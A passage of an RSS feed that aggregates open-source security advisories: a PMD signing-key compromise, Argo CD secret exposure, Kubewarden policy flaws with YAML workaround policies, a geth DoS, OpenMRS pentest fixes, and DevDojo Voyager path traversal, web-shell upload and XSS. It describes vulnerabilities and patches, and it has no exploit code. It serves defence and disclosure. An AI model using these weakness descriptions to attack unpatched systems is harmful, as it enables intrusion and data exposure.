   Additionally the key has been used to sign the last release of [PMD Eclipse Plugin 7.9.0.v20241227-1626-r](https:&#x2F;&#x2F;github.com&#x2F;pmd&#x2F;pmd-eclipse-plugin&#x2F;releases&#x2F;tag&#x2F;7.9.0.v20241227-1626-r).

The keys have been used exclusively for signing artifacts that we published to Maven Central under group id `net.sourceforge.pmd` and once for our pmd-eclipse-plugin. The private key itself is not known to have been compromised itself, but given its passphrase is, it must also be considered potentially compromised.

As a mitigation, both compromised keys have been revoked so that no future use of the keys are possible.
For future releases of PMD, PMD Designer and PMD Eclipse Plugin we use a new release signing key:
`2EFA 55D0 785C 31F9 56F2  F87E A0B5 CA1A 4E08 6838` (PMD Release Signing Key &amp;lt;releases@pmd-code.org&amp;gt;).

Note, that the published artifacts in Maven Central under the group id `net.sourceforge.pmd` are **not**
compromised and the signatures are valid. No other past usages of the private key is known to the project
and no future use is possible due to the revocation. If anybody finds a past abuse of the private key,
please share with us.

Note, the module `net.sourceforge.pmd:pmd-ui` has been renamed to `net.sourceforge.pmd:pmd-designer` since PMD 7, so there won&#x27;t be a fixed version for `pmd-ui`.

### Fixes
* Reworked build script in PMD Designer to not include all system properties
  * https:&#x2F;&#x2F;github.com&#x2F;pmd&#x2F;pmd-designer&#x2F;commit&#x2F;1548f5f27ba2981b890827fecbd0612fa70a0362
  * https:&#x2F;&#x2F;github.com&#x2F;pmd&#x2F;pmd-designer&#x2F;commit&#x2F;e87a45312753ec46b3e5576c6f6ac1f7de2f5891

### References

* [GHSA-88m4-h43f-wx84](https:&#x2F;&#x2F;github.com&#x2F;pmd&#x2F;pmd&#x2F;security&#x2F;advisories&#x2F;GHSA-88m4-h43f-wx84)
* [CVE-2025-23215](https:&#x2F;&#x2F;www.cve.org&#x2F;CVERecord?id=CVE-2025-23215)
* [reproducible-central](https:&#x2F;&#x2F;github.com&#x2F;jvm-repo-rebuild&#x2F;reproducible-central?tab=readme-ov-file#reproducible-builds-for-maven-central-repository)
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2025-24802: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2025-24802</link>
                    <pubDate>2025-01-30T20:15:51Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2025-24802'>https://osv.dev/vulnerability/CVE-2025-24802</a><br>
                            <b>Published:</b> 2025-01-30T20:15:51Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> rs<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/0xPolygonZero/plonky2/blob/main/plonky2/src/plonk/prover.rs#L97'>https://github.com/0xPolygonZero/plonky2/blob/main/plonky2/src/plonk/prover.rs#L97</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Plonky2 is a SNARK implementation based on techniques from PLONK and FRI. Lookup tables, whose length is not divisible by 26 = floor(num_routed_wires &#x2F; 3) always include the 0 -&amp;gt; 0 input-output pair. Thus a malicious prover can always prove that f(0) = 0 for any lookup table f (unless its length happens to be divisible by 26). The cause of problem is that the LookupTableGate-s are padded with zeros. A workaround from the user side is to extend the table (by repeating some entries) so that its length becomes divisible by 26. This vulnerability is fixed in 1.0.1.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-gitlab-2025-0290: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-gitlab-2025-0290</link>
                    <pubDate>2025-01-30T19:13:11.925Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-gitlab-2025-0290'>https://osv.dev/vulnerability/BIT-gitlab-2025-0290</a><br>
                            <b>Published:</b> 2025-01-30T19:13:11.925Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://gitlab.com/gitlab-org/gitlab/-/issues/372134'>https://gitlab.com/gitlab-org/gitlab/-/issues/372134</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue has been discovered in GitLab CE&#x2F;EE affecting all versions starting from 15.0 prior to 17.5.5, from 17.6 prior to 17.6.3, and from 17.7 prior to 17.7.1. Under certain conditions, processing of CI artifacts metadata could cause background jobs to become unresponsive.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-47g2-qmh2-749v: 6.8 | <b>Argo CD does not scrub secret values from patch errors</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-47g2-qmh2-749v</link>
                    <pubDate>2025-01-30T17:52:45Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-47g2-qmh2-749v'>https://osv.dev/vulnerability/GHSA-47g2-qmh2-749v</a><br>
                            <b>Published:</b> 2025-01-30T17:52:45Z<br>
                            <b>Severity:</b> 6.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/argoproj/argo-cd/security/advisories/GHSA-47g2-qmh2-749v'>https://github.com/argoproj/argo-cd/security/advisories/GHSA-47g2-qmh2-749v</a></li><li>- <a target='_blank' href='https://github.com/argoproj/gitops-engine/security/advisories/GHSA-274v-mgcv-cm8j'>https://github.com/argoproj/gitops-engine/security/advisories/GHSA-274v-mgcv-cm8j</a></li><li>- <a target='_blank' href='https://github.com/argoproj/argo-cd/commit/6f5537bdf15ddbaa0f27a1a678632ff0743e4107'>https://github.com/argoproj/argo-cd/commit/6f5537bdf15ddbaa0f27a1a678632ff0743e4107</a></li><li>- <a target='_blank' href='https://github.com/argoproj/gitops-engine/commit/7e21b91e9d0f64104c8a661f3f390c5e6d73ddca'>https://github.com/argoproj/gitops-engine/commit/7e21b91e9d0f64104c8a661f3f390c5e6d73ddca</a></li><li>- <a target='_blank' href='https://github.com/argoproj/argo-cd'>https://github.com/argoproj/argo-cd</a></li></ul><br>
                            <b>Details:</b> <b>Argo CD does not scrub secret values from patch errors</b><br>### Impact

A vulnerability was discovered in Argo CD that exposed secret values in error messages and the diff view when an invalid Kubernetes Secret resource was synced from a repository. 

The vulnerability assumes the user has write access to the repository and can exploit it, either intentionally or unintentionally, by committing an invalid Secret to repository and triggering a Sync. Once exploited, any user with read access to Argo CD can view the exposed secret data.

### Patches
A patch for this vulnerability is available in the following Argo CD versions:
- v2.13.4
- v2.12.10
- v2.11.13

### Workarounds
There is no workaround other than upgrading.

### References
Fixed with commit https:&#x2F;&#x2F;github.com&#x2F;argoproj&#x2F;argo-cd&#x2F;commit&#x2F;6f5537bdf15ddbaa0f27a1a678632ff0743e4107 &amp; https:&#x2F;&#x2F;github.com&#x2F;argoproj&#x2F;gitops-engine&#x2F;commit&#x2F;7e21b91e9d0f64104c8a661f3f390c5e6d73ddca
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-fc89-jghx-8pvg: 6.5 | <b>KubeWarden&#x27;s AdmissionPolicy and AdmissionPolicyGroup policies can be used to alter PolicyReport resources</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-fc89-jghx-8pvg</link>
                    <pubDate>2025-01-30T17:52:37Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-fc89-jghx-8pvg'>https://osv.dev/vulnerability/GHSA-fc89-jghx-8pvg</a><br>
                            <b>Published:</b> 2025-01-30T17:52:37Z<br>
                            <b>Severity:</b> 6.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/kubewarden/kubewarden-controller/security/advisories/GHSA-fc89-jghx-8pvg'>https://github.com/kubewarden/kubewarden-controller/security/advisories/GHSA-fc89-jghx-8pvg</a></li><li>- <a target='_blank' href='https://github.com/kubewarden/kubewarden-controller/commit/8124039b5f0c955d0ee8c8ca12d4415282f02d2c'>https://github.com/kubewarden/kubewarden-controller/commit/8124039b5f0c955d0ee8c8ca12d4415282f02d2c</a></li><li>- <a target='_blank' href='https://github.com/kubewarden/kubewarden-controller'>https://github.com/kubewarden/kubewarden-controller</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2025-3434'>https://pkg.go.dev/vuln/GO-2025-3434</a></li></ul><br>
                            <b>Details:</b> <b>KubeWarden&#x27;s AdmissionPolicy and AdmissionPolicyGroup policies can be used to alter PolicyReport resources</b><br>### Impact

By design, AdmissionPolicy and AdmissionPolicyGroup can evaluate only namespaced resources. The resources to be evaluated are determined by the rules provided by the user when defining the policy.
There might be Kubernetes namespaced resources that should not be validated by AdmissionPolicy and by the AdmissionPolicyGroup policies because of their sensitive nature.
For example, PolicyReport are namespaced resources that contain the list of non compliant objects found inside of a namespace. See [this section](https:&#x2F;&#x2F;docs.kubewarden.io&#x2F;explanations&#x2F;audit-scanner&#x2F;policy-reports) of Kubewarden’s documentation for more details about PolicyReport resources.
An attacker can use either an AdmissionPolicy or an AdmissionPolicyGroup to prevent the creation and update of PolicyReport objects to hide non-compliant resources.
Moreover, the same attacker might use a mutating AdmissionPolicy to alter the contents of the PolicyReport created inside of the namespace.

### Patches

Starting from the 1.21.0 release, the validation rules applied to AdmissionPolicy and AdmissionPolicyGroup have been tightened to prevent them from validating sensitive types of namespaced resources.
The new validation will also restrict the usage of wildcards when defining apiGroups and resources rules for AdmissionPolicy and AdmissionPolicyGroup objects.

### Workarounds

On clusters running Kubewarden &amp;lt; 1.21.0, the following Kubewarden policy can be applied to prevent the creation of AdmissionPolicy and AdmissionPolicyGroup resources that interact with PolicyReport resources:

```yaml
apiVersion: policies.kubewarden.io&#x2F;v1
kind: ClusterAdmissionPolicy
metadata:
  name: &quot;deny-interaction-with-policyreport&quot;
spec:
  module: registry:&#x2F;&#x2F;ghcr.io&#x2F;kubewarden&#x2F;policies&#x2F;cel-policy:latest
  settings:
    variables:
      - name: hasWildcardInsideOfApiGroup
        expression: &quot;object.spec.rules.exists(r, r.apiGroups.exists(ag, ag == &#x27;*&#x27;))&quot;
      - name: hasWildcardInsideOfResources
        expression: &quot;object.spec.rules.exists(r, r.resources.exists(ag, ag == &#x27;*&#x27; || ag == &#x27;*&#x2F;*&#x27; || ag == &#x27;policyreports&#x2F;*&#x27;))&quot;
      - name: dealsWithPolicyReportApiGroup
        expression: &quot;object.spec.rules.exists(r, r.apiGroups.exists(ag, ag == &#x27;wgpolicyk8s.io&#x27;))&quot;
      - name: dealsWithPolicyReportResource
        expression: &quot;object.spec.rules.exists(r, r.resources.exists(ag, ag == &#x27;policyreports&#x27; || ag == &#x27;policyreports&#x2F;&#x27;))&quot;
      - name: isPendingDeletion
        expression: &quot;has(object.metadata.deletionTimestamp)&quot;
    validations:
      - expression: |
          !( variables.hasWildcardInsideOfApiGroup ||
             variables.hasWildcardInsideOfResources ||
             variables.dealsWithPolicyReportResource ||
             variables.dealsWithPolicyReportApiGroup
          ) || variables.isPendingDeletion
        message: &quot;cannot target PolicyReport resources or use wildcards in apiGroups or resources&quot;
  rules:
    - apiGroups: [&quot;policies.kubewarden.io&quot;]
      apiVersions: [&quot;v1&quot;]
      operations: [&quot;CREATE&quot;, &quot;UPDATE&quot;]
      resources: [&quot;admissionpolicies&quot;, &quot;admissionpolicygroups&quot;]
  mutating: false
  backgroundAudit: true
```

### For more information

If you have any questions or comments about this advisory you can contact the Kubewarden team using the procedures described under the “[security disclosure](https:&#x2F;&#x2F;docs.kubewarden.io&#x2F;disclosure)“ guidelines of the Kubewarden project.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-756x-m4mj-q96c: 4.3 | <b>Kubewarden-Controller information leak via AdmissionPolicyGroup Resource</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-756x-m4mj-q96c</link>
                    <pubDate>2025-01-30T17:52:25Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-756x-m4mj-q96c'>https://osv.dev/vulnerability/GHSA-756x-m4mj-q96c</a><br>
                            <b>Published:</b> 2025-01-30T17:52:25Z<br>
                            <b>Severity:</b> 4.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/kubewarden/kubewarden-controller/security/advisories/GHSA-756x-m4mj-q96c'>https://github.com/kubewarden/kubewarden-controller/security/advisories/GHSA-756x-m4mj-q96c</a></li><li>- <a target='_blank' href='https://github.com/kubewarden/kubewarden-controller/commit/51a88dfbb4c090ce0f76a22d98106518e0824d0b'>https://github.com/kubewarden/kubewarden-controller/commit/51a88dfbb4c090ce0f76a22d98106518e0824d0b</a></li><li>- <a target='_blank' href='https://github.com/kubewarden/kubewarden-controller'>https://github.com/kubewarden/kubewarden-controller</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2025-3435'>https://pkg.go.dev/vuln/GO-2025-3435</a></li></ul><br>
                            <b>Details:</b> <b>Kubewarden-Controller information leak via AdmissionPolicyGroup Resource</b><br>### Impact

The [policy group feature](https:&#x2F;&#x2F;docs.kubewarden.io&#x2F;explanations&#x2F;policy-groups), added to by the 1.17.0 release, introduced two new types of CRD: ClusterAdmissionPolicyGroup and AdmissionPolicyGroup. The former is cluster wide, while the latter is namespaced.

By being namespaced, the AdmissionPolicyGroup has a well constrained impact on cluster resources. Hence, it’s considered safe to allow non-admin users to create and manage these resources in the namespaces they own.
Kubewarden policies can be allowed to query the Kubernetes API at evaluation time; these types of policies are called “[context aware](https:&#x2F;&#x2F;docs.kubewarden.io&#x2F;reference&#x2F;spec&#x2F;context-aware-policies)“.
Context aware policies can perform list and get operations against a Kubernetes cluster. The queries are done using the ServiceAccount of the Policy Server instance that hosts the policy. That means that access to the cluster is determined by the RBAC rules that apply to that ServiceAccount.
The AdmissionPolicyGroup CRD allowed the deployment of context aware policies. This could allow an attacker to obtain information about resources that are out of their reach, by leveraging a higher access to the cluster granted to the ServiceAccount token used to run the policy.


The impact of this vulnerability depends on the privileges that have been granted to the ServiceAccount used to run the Policy Server and assumes that users are using the recommended best practices of keeping the Policy Server&#x27;s ServiceAccount least privileged. By default, the Kubewarden helm chart grants access to the following resources (cluster wide) only: Namespace, Pod, Deployment and Ingress.

### Patches

Starting from the 1.21.0 release, the AdmissionPolicyGroup CRD does not allow the definition of context aware policies. No modifications are needed neither for performing the upgrade nor afterwards.

### Workarounds

On clusters running Kubewarden &amp;lt; 1.21.0, the following Kubewarden policy can be applied to prevent the creation of AdmissionPolicyGroup resources that have access to Kubernetes resources:

```yaml
apiVersion: policies.kubewarden.io&#x2F;v1
kind: ClusterAdmissionPolicy
metadata:
  name: &quot;deny-admission-policy-groups-with-context-resources&quot;
spec:
  module: registry:&#x2F;&#x2F;ghcr.io&#x2F;kubewarden&#x2F;policies&#x2F;cel-policy:latest
  settings:
    variables:
      - name: hasContextAwareResources
        expression: &quot;object.spec.policies.exists(p, has(object.spec.policies[p].contextAwareResources))&quot;
      - name: isPendingDeletion
        expression: &quot;has(object.metadata.deletionTimestamp)&quot;
    validations:
      - expression: &quot;!variables.hasContextAwareResources || variables.isPendingDeletion&quot;
        message: &quot;AdmissionPolicyGroup has contextAwareResources defined&quot;
  rules:
    - apiGroups: [&quot;policies.kubewarden.io&quot;]
      apiVersions: [&quot;v1&quot;]
      operations: [&quot;CREATE&quot;, &quot;UPDATE&quot;]
      resources: [&quot;admissionpolicygroups&quot;]
  mutating: false
  backgroundAudit: true
```

Once the policy is applied, the [Kubewarden Audit Scanner](https:&#x2F;&#x2F;docs.kubewarden.io&#x2F;howtos&#x2F;audit-scanner) can be used to identify the AdmissionPolicyGroup policies that are violating this policy.

### For more information

If you have any questions or comments about this advisory you can contact the Kubewarden team using the procedures described under the “[security disclosure](https:&#x2F;&#x2F;docs.kubewarden.io&#x2F;disclosure)“ guidelines of the Kubewarden project.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-q26p-9cq4-7fc2: 6.6 | <b>Go Ethereum vulnerable to DoS via malicious p2p message</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-q26p-9cq4-7fc2</link>
                    <pubDate>2025-01-30T17:51:57Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-q26p-9cq4-7fc2'>https://osv.dev/vulnerability/GHSA-q26p-9cq4-7fc2</a><br>
                            <b>Published:</b> 2025-01-30T17:51:57Z<br>
                            <b>Severity:</b> 6.6<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/ethereum/go-ethereum/security/advisories/GHSA-q26p-9cq4-7fc2'>https://github.com/ethereum/go-ethereum/security/advisories/GHSA-q26p-9cq4-7fc2</a></li><li>- <a target='_blank' href='https://github.com/ethereum/go-ethereum/commit/fa9a2ff8687ec9efe57b4b9833d5590d20f8a83f'>https://github.com/ethereum/go-ethereum/commit/fa9a2ff8687ec9efe57b4b9833d5590d20f8a83f</a></li><li>- <a target='_blank' href='https://github.com/ethereum/go-ethereum'>https://github.com/ethereum/go-ethereum</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2025-3436'>https://pkg.go.dev/vuln/GO-2025-3436</a></li></ul><br>
                            <b>Details:</b> <b>Go Ethereum vulnerable to DoS via malicious p2p message</b><br>### Impact

A vulnerable node can be forced to shutdown&#x2F;crash using a specially crafted message.

More in-depth details will be released at a later time.

### Patches

A fix has been included in geth version 1.14.13 and onwards.

### Workarounds

Unfortunately, no workaround is available.

### Credits

This issue was originally reported to Polygon Security by David Matosse (@iam-ned).
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-274v-mgcv-cm8j: 6.8 | <b>Argo CD GitOps Engine does not scrub secret values from patch errors</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-274v-mgcv-cm8j</link>
                    <pubDate>2025-01-30T17:51:33Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-274v-mgcv-cm8j'>https://osv.dev/vulnerability/GHSA-274v-mgcv-cm8j</a><br>
                            <b>Published:</b> 2025-01-30T17:51:33Z<br>
                            <b>Severity:</b> 6.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/argoproj/argo-cd/security/advisories/GHSA-47g2-qmh2-749v'>https://github.com/argoproj/argo-cd/security/advisories/GHSA-47g2-qmh2-749v</a></li><li>- <a target='_blank' href='https://github.com/argoproj/gitops-engine/security/advisories/GHSA-274v-mgcv-cm8j'>https://github.com/argoproj/gitops-engine/security/advisories/GHSA-274v-mgcv-cm8j</a></li><li>- <a target='_blank' href='https://github.com/argoproj/argo-cd/commit/6f5537bdf15ddbaa0f27a1a678632ff0743e4107'>https://github.com/argoproj/argo-cd/commit/6f5537bdf15ddbaa0f27a1a678632ff0743e4107</a></li><li>- <a target='_blank' href='https://github.com/argoproj/gitops-engine/commit/7e21b91e9d0f64104c8a661f3f390c5e6d73ddca'>https://github.com/argoproj/gitops-engine/commit/7e21b91e9d0f64104c8a661f3f390c5e6d73ddca</a></li><li>- <a target='_blank' href='https://github.com/argoproj/gitops-engine'>https://github.com/argoproj/gitops-engine</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2025-3437'>https://pkg.go.dev/vuln/GO-2025-3437</a></li></ul><br>
                            <b>Details:</b> <b>Argo CD GitOps Engine does not scrub secret values from patch errors</b><br>### Impact
A vulnerability was discovered in Argo CD that exposed secret values in error messages and the diff view when an invalid Kubernetes Secret resource was synced from a repository. 

The vulnerability assumes the user has write access to the repository and can exploit it, either intentionally or unintentionally, by committing an invalid Secret to repository and triggering a Sync. Once exploited, any user with read access to Argo CD can view the exposed secret data.

### Patches
A patch for this vulnerability is available in the following Argo CD versions:
- v2.13.4
- v2.12.10
- v2.11.13

### Workarounds
There is no workaround other than upgrading.

### References
Fixed with commit https:&#x2F;&#x2F;github.com&#x2F;argoproj&#x2F;argo-cd&#x2F;commit&#x2F;6f5537bdf15ddbaa0f27a1a678632ff0743e4107 &amp; https:&#x2F;&#x2F;github.com&#x2F;argoproj&#x2F;gitops-engine&#x2F;commit&#x2F;7e21b91e9d0f64104c8a661f3f390c5e6d73ddca
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-vpxm-cr3r-pjp9: 0 | <b>General OpenMRS Security Advisory, January 2025: Penetration Testing Results and Patches</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-vpxm-cr3r-pjp9</link>
                    <pubDate>2025-01-30T17:50:52Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-vpxm-cr3r-pjp9'>https://osv.dev/vulnerability/GHSA-vpxm-cr3r-pjp9</a><br>
                            <b>Published:</b> 2025-01-30T17:50:52Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/openmrs/openmrs-core/security/advisories/GHSA-vpxm-cr3r-pjp9'>https://github.com/openmrs/openmrs-core/security/advisories/GHSA-vpxm-cr3r-pjp9</a></li><li>- <a target='_blank' href='https://github.com/openmrs/openmrs-core'>https://github.com/openmrs/openmrs-core</a></li></ul><br>
                            <b>Details:</b> <b>General OpenMRS Security Advisory, January 2025: Penetration Testing Results and Patches</b><br>### Impact
We recently underwent Penetration Testing of OpenMRS by a third-party company. **Vulnerabilities were found, and fixes have been made and released.** We&#x27;ve released security updates that include critical fixes, and so, we strongly recommend upgrading affected modules.

**This notice applies to _all_ OpenMRS instances.** The testers used the OpenMRS v3 Reference Application (O3 RefApp); however, their findings highlighted modules commonly used in older OpenMRS applications, including the O2 RefApp. 

## Vulnerability Details
- The issues uncovered included broken access control (e.g. inappropriate admin access), phishing vulnerability, and stored XSS (e.g. vulnerable passwords).
- No vulnerabilities were found in the O3 frontend esm modules. 
- The Letter of Attestation from the penetration test is [available here](https:&#x2F;&#x2F;drive.google.com&#x2F;file&#x2F;d&#x2F;1sBm4-FzLA8hSoM9wYknBfgEttBHyLvoU&#x2F;view?usp=sharing) for your reference. 
- After the fixes were applied, the OpenMRS O3 RefApp met a Security Level of “Excellent, Grade A”.
- The full detailed Remediation Pentest Report is available to Implementation Technical Leads upon request.

### Patches
**Minimum Requirements for Implementers:** We **strongly** recommend upgrading your modules to the following versions (or greater) as soon as possible. **This is the minimum amount to do and be protected from the vulnerabilities found and fixed.** The following versions contain the patch: 

- **Platform** 2.6.11+ 
  - How: Increase your platform version number wherever this is specified in your implementation. If you use the OpenMRS SDK, this will be in the distro.properties file.
  - Notes: 
    - The newly released [**Platform 2.7**](https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;openmrs&#x2F;files&#x2F;releases&#x2F;OpenMRS_Platform_2.7.0&#x2F;) also includes the fixes. [Release Notes and more download options here](https:&#x2F;&#x2F;openmrs.atlassian.net&#x2F;wiki&#x2F;x&#x2F;XoBzEQ).
    - Platform 2.6.8+ has most of the fixes, but these are broken if you don&#x27;t use SSL, so Platform 2.6.11 or higher is preferred.
    - For those still on Platform 2.5+ such as the Bahmni ecosystem, the new [2.5.14](https:&#x2F;&#x2F;ci.openmrs.org&#x2F;browse&#x2F;TRUNK-CORE2-232) release includes the patch. _Bahmni note: The upcoming patch release for both Bahmni Lite and Bahmni Standard will incorporate these security fixes._
- **Legacy UI** OMOD 1.21.0+ ([here](https:&#x2F;&#x2F;addons.openmrs.org&#x2F;show&#x2F;org.openmrs.module.legacyui))
- **ID Gen** OMOD 4.14.0+ ([here](https:&#x2F;&#x2F;addons.openmrs.org&#x2F;show&#x2F;org.openmrs.module.idgen))
- **Address Hierarchy** OMOD 2.19.0+ ([here](https:&#x2F;&#x2F;addons.openmrs.org&#x2F;show&#x2F;org.openmrs.module.addresshierarchy))
- **Attachments** OMOD 3.6.0+ ([here](https:&#x2F;&#x2F;addons.openmrs.org&#x2F;show&#x2F;org.openmrs.module.attachments))
- **Patient Flags** OMOD 3.0.8+ ([here](https:&#x2F;&#x2F;addons.openmrs.org&#x2F;show&#x2F;org.openmrs.module.patientflags))

### Workarounds
There are no practical workarounds to fix or remediate the vulnerabilities without upgrading. Technically, you could remove the affected OMODs, but this would badly degrade the system&#x27;s functionality.

## Thank you to our amazing Security contributors!
Thank you to security firm UnderDefense, and to the OpenMRS Security Group contributors for their patch support - specific thanks to Daniel Kayiwa, Samuel Lubwama, Ian Bacher, Rafal Korytkowski, and Michael Seaton. 

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-j63m-2vr6-fv7m: 7.7 | <b>DevDojo Voyager vulnerable to path traversal</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-j63m-2vr6-fv7m</link>
                    <pubDate>2025-01-30T15:31:39Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-j63m-2vr6-fv7m'>https://osv.dev/vulnerability/GHSA-j63m-2vr6-fv7m</a><br>
                            <b>Published:</b> 2025-01-30T15:31:39Z<br>
                            <b>Severity:</b> 7.7<br>
                            <b>Langs:</b> php<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/thedevdojo/voyager'>https://github.com/thedevdojo/voyager</a></li><li>- <a target='_blank' href='https://github.com/thedevdojo/voyager/blob/1.6/src/Http/Controllers/VoyagerCompassController.php#L213'>https://github.com/thedevdojo/voyager/blob/1.6/src/Http/Controllers/VoyagerCompassController.php#L213</a></li><li>- <a target='_blank' href='https://github.com/thedevdojo/voyager/blob/1.6/src/Http/Controllers/VoyagerCompassController.php#L44'>https://github.com/thedevdojo/voyager/blob/1.6/src/Http/Controllers/VoyagerCompassController.php#L44</a></li><li>- <a target='_blank' href='https://www.sonarsource.com/blog/the-tainted-voyage-uncovering-voyagers-vulnerabilities'>https://www.sonarsource.com/blog/the-tainted-voyage-uncovering-voyagers-vulnerabilities</a></li></ul><br>
                            <b>Details:</b> <b>DevDojo Voyager vulnerable to path traversal</b><br>DevDojo Voyager through 1.8.0 is vulnerable to path traversal at the &#x2F;admin&#x2F;compass.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-35p2-5vrh-m3p6: 4.3 | <b>DevDojo Voyager Arbitrary File Write</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-35p2-5vrh-m3p6</link>
                    <pubDate>2025-01-30T15:31:39Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-35p2-5vrh-m3p6'>https://osv.dev/vulnerability/GHSA-35p2-5vrh-m3p6</a><br>
                            <b>Published:</b> 2025-01-30T15:31:39Z<br>
                            <b>Severity:</b> 4.3<br>
                            <b>Langs:</b> php<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/thedevdojo/voyager'>https://github.com/thedevdojo/voyager</a></li><li>- <a target='_blank' href='https://github.com/thedevdojo/voyager/blob/1.6/src/Http/Controllers/VoyagerMediaController.php#L238'>https://github.com/thedevdojo/voyager/blob/1.6/src/Http/Controllers/VoyagerMediaController.php#L238</a></li><li>- <a target='_blank' href='https://www.sonarsource.com/blog/the-tainted-voyage-uncovering-voyagers-vulnerabilities'>https://www.sonarsource.com/blog/the-tainted-voyage-uncovering-voyagers-vulnerabilities</a></li></ul><br>
                            <b>Details:</b> <b>DevDojo Voyager Arbitrary File Write</b><br>DevDojo Voyager through version 1.8.0 is vulnerable to bypassing the file type verification when an authenticated user uploads a file via &#x2F;admin&#x2F;media&#x2F;upload. An authenticated user can upload a web shell causing arbitrary code execution on the server.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-mm49-4f2g-c3wf: 2.0 | <b>DevDojo Voyager vulnerable to reflected Cross-site Scripting</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-mm49-4f2g-c3wf</link>
                    <pubDate>2025-01-30T15:31:39Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-mm49-4f2g-c3wf'>https://osv.dev/vulnerability/GHSA-mm49-4f2g-c3wf</a><br>
                            <b>Published:</b> 2025-01-30T15:31:39Z<br>
                            <b>Severity:</b> 2.0<br>
                            <b>Langs:</b> php<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/thedevdojo/voyager'>https://github.com/thedevdojo/voyager</a></li><li>- <a target='_blank' href='https://github.com/thedevdojo/voyager/blob/1.6/resources/views/master.blade.php#L132'>https://github.com/thedevdojo/voyager/blob/1.6/resources/views/master.blade.php#L132</a></li><li>- <a target='_blank' href='https://github.com/thedevdojo/voyager/blob/1.6/src/Http/Controllers/VoyagerCompassController.php#L44'>https://github.com/thedevdojo/voyager/blob/1.6/src/Http/Controllers/VoyagerCompassController.php#L44</a></li><li>- <a target='_blank' href='https://www.sonarsource.com/blog/the-tainted-voyage-uncovering-voyagers-vulnerabilities'>https://www.sonarsource.com/blog/the-tainted-voyage-uncovering-voyagers-vulnerabilities</a></li></ul><br>
                            <b>Details:</b> <b>DevDojo Voyager vulnerable to reflected Cross-site Scripting</b><br>DevDojo Voyager through version 1.8.0 is vulnerable to reflected XSS via &#x2F;admin&#x2F;compass. By manipulating an authenticated user to click on a link, arbitrary Javascript can be executed.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-55415: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-55415</link>
                    <pubDate>2025-01-30T15:15:17Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-55415'>https://osv.dev/vulnerability/CVE-2024-55415</a><br>
                            <b>Published:</b> 2025-01-30T15:15:17Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> php<br>
